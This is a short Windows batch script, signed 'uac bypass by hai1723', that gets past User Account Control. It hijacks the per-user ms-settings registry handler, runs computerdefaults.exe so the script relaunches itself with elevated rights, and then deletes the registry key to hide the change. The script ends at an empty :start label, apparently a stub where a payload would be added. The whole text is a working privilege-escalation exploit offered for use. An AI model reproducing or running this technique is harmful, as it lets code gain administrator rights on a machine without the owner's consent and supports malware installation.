@echo off
echo uac bypass by hai1723
cls
net session >nul 2>&1
if not %errorlevel% == 0 ( goto :uac)
goto :start
:uac
reg add hkcu\Software\Classes\ms-settings\shell\open\command /d "%~f0" /f
reg add hkcu\Software\Classes\ms-settings\shell\open\command /v "DelegateExecute" /f
computerdefaults --nouacbypass
reg delete hkcu\Software\Classes\ms-settings /f
exit
:start

